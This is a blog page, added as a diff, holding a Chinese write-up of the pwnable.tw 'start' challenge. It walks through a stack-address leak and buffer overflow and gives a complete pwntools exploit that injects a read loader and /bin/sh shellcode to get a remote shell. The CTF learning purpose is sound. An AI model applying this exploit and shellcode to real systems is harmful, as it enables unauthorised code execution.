@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/pure-min.css" integrity="sha384-cg6SkqEOCV1NbJoCu11+bm0NvBRc8IYLRGXkmNrqUBfTjmMYwNKPWBTIKyw9mHNJ" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/grids-responsive-min.css">
+  <link rel="stylesheet" href="/assets/styles.css"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>pwnable.tw解題 | elephacking</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="pwnable.tw解題" />
+<meta name="author" content="Elephacking" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="一直都很想去學習binary [xxxx xxxx ESP_point_here ESP]:20bytes" />
+<meta property="og:description" content="一直都很想去學習binary [xxxx xxxx ESP_point_here ESP]:20bytes" />
+<link rel="canonical" href="https://blog.hitlab.space/2017/06/10/pwnable.tw%E8%A7%A3%E9%A1%8C/" />
+<meta property="og:url" content="https://blog.hitlab.space/2017/06/10/pwnable.tw%E8%A7%A3%E9%A1%8C/" />
+<meta property="og:site_name" content="elephacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-06-10T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw解題" />
+<meta name="twitter:site" content="@<hidden>" />
+<meta name="twitter:creator" content="@Elephacking" />
+<meta name="google-site-verification" content="xxxxx" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"https://blog.hitlab.space/2017/06/10/pwnable.tw%E8%A7%A3%E9%A1%8C/","headline":"pwnable.tw解題","dateModified":"2017-06-10T00:00:00+08:00","datePublished":"2017-06-10T00:00:00+08:00","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://blog.hitlab.space/assets/icons/favicon.ico"},"name":"Elephacking"},"author":{"@type":"Person","name":"Elephacking"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.hitlab.space/2017/06/10/pwnable.tw%E8%A7%A3%E9%A1%8C/"},"description":"一直都很想去學習binary [xxxx xxxx ESP_point_here ESP]:20bytes","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="https://blog.hitlab.space/feed.xml" title="elephacking" />
+</head>
+
+
+  <body>
+
+    <div class="container pure-g"><div class="sidebar-left pure-u-1 pure-u-md-1-4" style="background-color: rgb(40, 73, 77); color: rgb(255, 255, 255); background-image: url(/assets/img/sidebar-bg.jpg);"><header class="masthead">
+  <div class="avatar"><img src="/assets/icons/logo.png" class="avatar-image" alt="Elephacking">
+    </div>
+  <div class="masthead-title">
+    <a href="/" title="Home">elephacking</a>
+  </div>
+  <div class="masthead-tagline">
+    <small>A Slave, a Security Fans, a Pentester, a Red Teamer - 隨便寫寫Cyber Security，在大學學到的東西和工作學到的東西 - I am moving my posts from the old blog to jekyll... -</small>
+  </div><nav class="navigation">
+    <ul class="navigation-list"><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/">Blog</a>
+      </li><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/about/">About</a>
+      </li></ul>
+  </nav><div class="social pure-menu pure-menu-horizontal">
+      <ul class="social-icons pure-menu-list">
+      <li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="mailto://elephacking@gmail.com">
+            <i class="fas fa-envelope" title="Email"></i>
+          </a>
+        </li><li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="https://github.com/elephacking">
+            <i class="fab fa-github" title="GitHub"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+</header>
+</div>
+
+      <div class="content pure-u-1 pure-u-md-1-2"><main>
+  <article class="post">
+  <h1 class="post-title">pwnable.tw解題</h1>
+  <div class="post-meta"><time datetime="2017-06-10T00:00:00+08:00" itemprop="datePublished">10 Jun 2017</time></div>
+
+  <p>一直都很想去學習binary</p>
+
+<h1 id="第一題-start第一題-start">第一題: start第一題: start</h1>
+<p>透過IDA Pro，發現程式先call了write(‘Let’s start the CTF:’)再read入字串，存放在’Let’s start the CTF:’的stack裡，由於什麼都沒開，理應可直接把shellcode放到stack上執行。問題是stack的address是什麼。</p>
+
+<p>dump出_start的asm:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dump of assembler code for function _start:
+0x08048060 &lt;+0&gt;: push esp
+0x08048061 &lt;+1&gt;: push 0x804809d
+0x08048066 &lt;+6&gt;: xor eax,eax
+0x08048068 &lt;+8&gt;: xor ebx,ebx
+0x0804806a &lt;+10&gt;: xor ecx,ecx
+0x0804806c &lt;+12&gt;: xor edx,edx
+0x0804806e &lt;+14&gt;: push 0x3a465443
+0x08048073 &lt;+19&gt;: push 0x20656874
+0x08048078 &lt;+24&gt;: push 0x20747261
+0x0804807d &lt;+29&gt;: push 0x74732073
+0x08048082 &lt;+34&gt;: push 0x2774654c
+0x08048087 &lt;+39&gt;: mov ecx,esp
+0x08048089 &lt;+41&gt;: mov dl,0x14
+0x0804808b &lt;+43&gt;: mov bl,0x1
+0x0804808d &lt;+45&gt;: mov al,0x4
+0x0804808f &lt;+47&gt;: int 0x80
+0x08048091 &lt;+49&gt;: xor ebx,ebx
+0x08048093 &lt;+51&gt;: mov dl,0x3c
+0x08048095 &lt;+53&gt;: mov al,0x3
+0x08048097 &lt;+55&gt;: int 0x80
+0x08048099 &lt;+57&gt;: add esp,0x14
+0x0804809c &lt;+60&gt;: ret
+</code></pre></div></div>
+
+<p>發現在push字串(0x0804806e &lt;+14&gt;)之前，有兩個push的動作，</p>
+
+<p>0x08048061 &lt;+1&gt;: push return address: 可劫持去自定義的shellcode</p>
+
+<p>0x08048060 &lt;+0&gt;:push esp: 這不就是我想要的stack address嘛</p>
+
+<p>攻擊思路如下:</p>
+
+<p>先return去0x08048087 &lt;+39&gt;，觸發ecx = esp再write(*ecx)，這時的esp由於經過0x08048099 &lt;+57&gt;: add esp,0x14和0x0804809c &lt;+60&gt;: ret，所以等於在執行0x08048060 &lt;+0&gt;之後的address，直接就可以print出0x08048060 &lt;+0&gt;:push esp的esp address了。</p>
+
+<p>注意: 這裡print出的esp和利用的esp是不同的，因為在push esp後，register的esp應該加了4，所以print出的esp為實際的esp-4。</p>
+
+<p>再去準備好stack的layout:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=======high========
+
+[shellcode payload: 少於或等於0x24 bytes: (0x3c – padding(0x14) – return_address(0x4)]
+
+[return_address: 4 bytes] [Part C]
+
+[padding: 0x14 bytes]:
+
+[ xxxxxxx: 0x0c bytes] [Part B]
+[ print esp 指到這個address: 4 bytes] [Part A]
+[ esp 內容指到上面的address: 4 bytes ]
+
+=======low=========
+</code></pre></div></div>
+
+<p>注意第二次劫持的return_address就是leak出來的esp_address + 0x14 =&gt; (Part A + Part B + Part C)</p>
+
+<p>上面方法的完整利用就不附了，因為我用了下面這個有少少修改的方法XD</p>
+
+<p>少少修改的方法:</p>
+
+<p>雖然少於0x24bytes的shellcode可以google一下就會找到，但我想試試利用多一個自定的read去做中轉，再放入大點的shellcode，所以寫了個read的中轉shellcode來獻醜一下。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>my_loader = “""xor eax, eax
+xor ebx, ebx
+mov al, 0x3
+mov dl, 0x3C
+mov ecx, %s
+int 0x80
+jmp ecx
+“"" % hex(shellcode_address)
+</code></pre></div></div>
+
+<p>利用這個read的shellcode去中轉就可以加大shellcode的份量，實測放下asm(shellcraft.i386.linux.sh())也沒問題。</p>
+
+<p>stack的Layout和方法一的差不多，</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=======high========
+
+[真正的shellcode]
+
+[中轉用的read shellcode]
+
+[return_address: 4 bytes] [Part C]
+
+[padding: 0x14 bytes]:
+
+[ xxxxxxx: 0x0c bytes] [Part B]
+[ print esp 指到這個address: 4 bytes] [Part A]
+[ esp 內容指到上面的address: 4 bytes ]
+
+=======low=========
+</code></pre></div></div>
+
+<p>完整利用:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="err">‘</span><span class="n">chall</span><span class="p">.</span><span class="n">pwnable</span><span class="p">.</span><span class="n">tw</span><span class="err">’</span><span class="p">,</span> <span class="mi">10000</span><span class="p">))</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">.</span><span class="n">fromsocket</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="c1">#sh = process(‘/home/user/start’)
+</span><span class="n">fillcode</span> <span class="o">=</span> <span class="err">‘</span><span class="n">a</span><span class="err">’</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">leak_address</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="c1">#s21 = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80″ #少於0x24bytes的shellcode
+</span>
+<span class="n">my_loader</span> <span class="o">=</span> <span class="err">“</span><span class="s">""</span><span class="n">nop</span>
+<span class="n">nop</span>
+<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+<span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+<span class="n">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3</span>
+<span class="n">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0x3C</span>
+<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="o">%</span><span class="n">s</span>
+<span class="nb">int</span> <span class="mh">0x80</span>
+<span class="n">jmp</span> <span class="n">ecx</span>
+<span class="err">“</span><span class="s">""</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">i386</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">leakESP</span><span class="p">():</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+<span class="n">leak_payload</span> <span class="o">=</span> <span class="n">fillcode</span> <span class="o">+</span> <span class="n">leak_address</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">leak_payload</span><span class="p">)</span>
+<span class="n">ESP_address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Leaked ESP: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ESP_address</span><span class="p">))</span>
+<span class="k">return</span> <span class="n">ESP_address</span>
+
+<span class="s">"""
+[HIGH]
+shellcode
+shellcode_address
+[xxxx
+xxxx
+ESP_point_here
+ESP]:20bytes
+[LOW]
+
+"""</span>
+
+<span class="k">def</span> <span class="nf">inject_loader</span><span class="p">(</span><span class="n">loadercode_addr</span><span class="p">):</span>
+<span class="c1">#program should be working on loadercode_addr
+</span><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">loadercode_addr</span> <span class="o">+</span> <span class="mi">20</span>
+<span class="n">loader</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">my_loader</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="err">‘</span><span class="n">inject</span> <span class="n">loader</span> <span class="nb">len</span><span class="p">:</span> <span class="o">%</span><span class="n">d</span><span class="err">’</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">loader</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fillcode</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">loadercode_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">loader</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="s">"""
+def pwn_by_passing_shellcode(ESP_address):
+shellcode = shell
+print(‘shell len: %d’ % len(shell))
+shellcode_addr = ESP_address + 20
+payload = fillcode + p32(shellcode_addr) + shellcode
+sh.send(payload)
+"""</span>
+
+<span class="k">def</span> <span class="nf">pwn_by_passing_shellcode</span><span class="p">():</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shell</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'shell len: %d'</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="n">leakESP</span><span class="p">()</span>
+<span class="n">pause</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">inject_loader</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">20</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">pwn_by_passing_shellcode</span><span class="p">()</span>
+<span class="n">pause</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>成功!</p>
+
+<h1 id="第二題-orw">第二題: orw</h1>
+
+
+  
+</article>
+
+
+<aside class="related">
+  <h3>Related posts</h3>
+  <ul class="related-posts">
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Joeys-screenshot-writeup/">
+          [SEC-T CTF]Joeys screenshot writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Jail-writeup/">
+          [SEC-T CTF]Jail writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Jail-2-writeup/">
+          [SEC-T CTF]Jail 2 writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+  </ul>
+</aside>
+
+
+</main>
+
+<footer class="footer"><small>
+    &copy; 2017&nbsp;-&nbsp;2021 <a href="https://github.com/elephacking">Elephacking</a>. All rights reserved.
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/vszhub/not-pure-poole">Not Pure Poole</a>.
+  </small>
+</footer>
+</div>
+      <div class="sidebar-right pure-u-1 pure-u-md-1-4">
+</div>
+    </div>
+
+    <script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script><script>
+  function strip(str, remove) {
+    while (str.length > 0 && remove.indexOf(str.charAt(0)) != -1) {
+      str = str.substr(1);
+    }
+    while (str.length > 0 && remove.indexOf(str.charAt(str.length - 1)) != -1) {
+      str = str.substr(0, str.length - 1);
+    }
+    return str;
+  }
+
+  function scroll() {
+    console.log('scroll');
+    window.scrollTo({
+      left: 0, 
+      top: window.innerHeight,
+      behavior: 'smooth'
+    });
+    sessionStorage.removeItem('forceCheckScroll');
+  }
+
+  const forceCheckScroll = sessionStorage.getItem('forceCheckScroll') === 'true';
+  const checkScroll = strip(window.location.pathname, '/') !== strip('', '/');
+
+  if (forceCheckScroll || checkScroll) {
+    const maxWidth = "(max-width: 48rem)";
+    const result = window.matchMedia(maxWidth);
+    if (result.matches) {
+      scroll();
+    } else {
+      result.addListener((match) => {
+        if (match.media == maxWidth) {
+          if (match.matches) {
+            scroll();
+          }
+        }
+      });
+    }
+  }
+</script>
+</body>
+</html>
